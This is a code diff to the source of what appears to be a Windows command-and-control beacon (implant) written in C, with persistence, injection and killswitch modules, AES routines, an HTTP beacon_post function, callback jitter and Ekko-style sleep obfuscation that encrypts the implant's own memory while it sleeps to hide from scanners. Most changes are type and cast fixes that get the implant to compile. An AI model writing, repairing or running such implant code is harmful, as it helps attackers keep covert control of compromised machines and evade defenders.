@@ -1,5 +1,7 @@
-#include "winhttp.h"
 #include "windows.h"
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <winhttp.h>
 #include "bcrypt.h"
 #include "ntdefs.h"
 #include "config.h"
@@ -10,9 +12,9 @@
 #include "persist.h"
 #include "injection.h"
 #include "killswitch.h"
-#include <winsock2.h>
-#include <ws2tcpip.h>
+#include<stdlib.h>
 #include <intrin.h>
+#include<stdio.h>
 #pragma comment(lib,"ws2_32.lib")
 #pragma comment(lib, "bcrypt.lib")
 #define KEYSIZE 32
@@ -299,13 +301,13 @@ BOOL InstallAesEncryption (PEAS pAes)
     BOOL bSTATE =TRUE;
     BCRYPT_ALG_HANDLE hAlgorithm = NULL;
     BCRYPT_KEY_HANDLE hKeyHandle = NULL;
-    ULONG cbResult = NULL;
-    DWORD dwBlockSize= NULL;
-    DWORD cbKeyObject = NULL;
+    ULONG cbResult = 0;
+    DWORD dwBlockSize= 0;
+    DWORD cbKeyObject = 0;
     PBYTE pbKeyObject = NULL;
     PBYTE pbCipherText = NULL;
-    DWORD cbCipherText = NULL;
-    NTSTATUS STATUS= NULL;
+    DWORD cbCipherText = 0;
+    NTSTATUS STATUS= 0;
     //intializing "hAlgorith" as AES algorithm Handle
     STATUS = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM,NULL,0);
     if(!NT_SUCCESS(STATUS))
@@ -400,15 +402,15 @@ BOOL InstallAesDecryption (PEAS pAes)
   BCRYPT_ALG_HANDLE hAlgorithm = NULL;
   BCRYPT_KEY_HANDLE hKeyHandle = NULL;
 
-  ULONG cbResult = NULL;
-  DWORD dwBlockSize = NULL;
+  ULONG cbResult = 0;
+  DWORD dwBlockSize =0 ;
 
-  DWORD cbKeyObject = NULL;
-  PBYTE pbKeyObject = NULL;
+  DWORD cbKeyObject = 0;
+  PBYTE pbKeyObject = 0;
 
   PBYTE pbPlainText = NULL;
-  DWORD cbPlainText = NULL;
-  NTSTATUS STATUS = NULL;
+  DWORD cbPlainText = 0;
+  NTSTATUS STATUS = 0;
 
   // Intializing "hAlgorithm" as AES algorithm Handle
   STATUS =
@@ -643,18 +645,16 @@ BOOL InitializeWinApi32(OUT PWIN32_API pWin32Apis) {
     }
 
     pWin32Apis->RtlCreateTimerQueue =
-        GetProcAddress(hNtdll, "RtlCreateTimerQueue");
-    pWin32Apis->RtlCreateTimer = GetProcAddress(hNtdll, "RtlCreateTimer");
+        (void *)GetProcAddress(hNtdll, "RtlCreateTimerQueue");
+    pWin32Apis->RtlCreateTimer =
+        (void *)GetProcAddress(hNtdll, "RtlCreateTimer");
     pWin32Apis->RtlDeleteTimerQueue =
-        GetProcAddress(hNtdll, "RtlDeleteTimerQueue");
-    pWin32Apis->NtCreateEvent = GetProcAddress(hNtdll, "NtCreateEvent");
+        (void *)GetProcAddress(hNtdll, "RtlDeleteTimerQueue");
+    pWin32Apis->NtCreateEvent = (void *)GetProcAddress(hNtdll, "NtCreateEvent");
     pWin32Apis->NtWaitForSingleObject =
-        GetProcAddress(hNtdll, "NtWaitForSingleObject");
+        (void *)GetProcAddress(hNtdll, "NtWaitForSingleObject");
     pWin32Apis->NtSignalAndWaitForSingleObject =
-        GetProcAddress(hNtdll, "NtSignalAndWaitForSingleObject");
-    pWin32Apis->NtContinue = GetProcAddress(hNtdll, "NtContinue");
-    pWin32Apis->SystemFunction032 =
-        GetProcAddress(hAdvapi32, "SystemFunction032");
+        (void *)GetProcAddress(hNtdll, "NtSignalAndWaitForSingleObject");
 
     // verify nothing came back NULL
     if (!pWin32Apis->RtlCreateTimerQueue || !pWin32Apis->RtlCreateTimer ||
@@ -670,24 +670,15 @@ BOOL InitializeWinApi32(OUT PWIN32_API pWin32Apis) {
 
 // ── Random 32-bit value via hardware RNG ─────────────────────────
 static ULONG Random32() {
-    UINT32 Seed = 0;
+    unsigned int Seed = 0;
     _rdrand32_step(&Seed);
     return Seed;
 }
 
-// ── Ekko sleep obfuscation ───────────────────────────────────────
-// What this does:
-//   1. Captures current thread CONTEXT via RtlCaptureContext
-//   2. Queues a ROP chain through timer callbacks using NtContinue
-//   3. Chain: WaitForSingleObjectEx → VirtualProtect(RW) →
-//             SystemFunction032(encrypt) → WaitForSingleObjectEx(sleep) →
-//             SystemFunction032(decrypt) → VirtualProtect(RX) → SetEvent
-//   4. While sleeping, beacon .text is encrypted garbage in memory
-//   5. On wake, image is restored and execution continues normally
 VOID EkkoObf(IN PWIN32_API pWin32Apis, IN DWORD dwTimeOut) {
     NTSTATUS Status = STATUS_SUCCESS;
-    STRING Key = {0};
-    STRING Img = {0};
+    USTRING Key = {0};
+    USTRING Img = {0};
     BYTE Rnd[16] = {0};
     CONTEXT Ctx[7] = {0};
     CONTEXT CtxInit = {0};
@@ -698,6 +689,7 @@ VOID EkkoObf(IN PWIN32_API pWin32Apis, IN DWORD dwTimeOut) {
     HANDLE Timer = NULL;
     DWORD Delay = 0;
     DWORD Value = 0;
+   
 
     // get beacon image base + size from PE headers
     PVOID ImageBase = GetModuleHandleA(NULL);
@@ -746,7 +738,8 @@ VOID EkkoObf(IN PWIN32_API pWin32Apis, IN DWORD dwTimeOut) {
     // all 7 ROP frames are cloned from this, each with modified
     // Rip/Rcx/Rdx/R8/R9 to fake a different function call
     if (!NT_SUCCESS(Status = pWin32Apis->RtlCreateTimer(
-                        Queue, &Timer, RtlCaptureContext, &CtxInit,
+                        Queue, &Timer,
+                        (WAITORTIMERCALLBACKFUNC)RtlCaptureContext, &CtxInit,
                         Delay += 100, 0, WT_EXECUTEINTIMERTHREAD)) ||
         !NT_SUCCESS(Status = pWin32Apis->RtlCreateTimer(
                         Queue, &Timer, (WAITORTIMERCALLBACKFUNC)SetEvent,
@@ -874,9 +867,9 @@ BOOL beacon_post(
     DWORD* responseLenOut
 ) {
     BOOL bSuccess = FALSE;
-    HINTERNET hSession = NULL;
-    HINTERNET hConnect = NULL;
-    HINTERNET hRequest = NULL;
+    HINTERNET hSession = 0;
+    HINTERNET hConnect = 0;
+    HINTERNET hRequest = 0;
     HMODULE hWinHttp = NULL;
     DWORD statusCode = 0;
     DWORD statusSize = sizeof(DWORD);
@@ -1066,7 +1059,7 @@ BOOL beacon_post(
 DWORD jitter(DWORD baseMs) {
     DWORD variation = (baseMs * JITTER_PERCENT) / 100;
     if (variation == 0) return baseMs;
-    DWORD rnd = 0;
+    unsigned int rnd = 0;
     _rdrand32_step(&rnd);
     return baseMs - variation + (rnd % (2 * variation));
 }
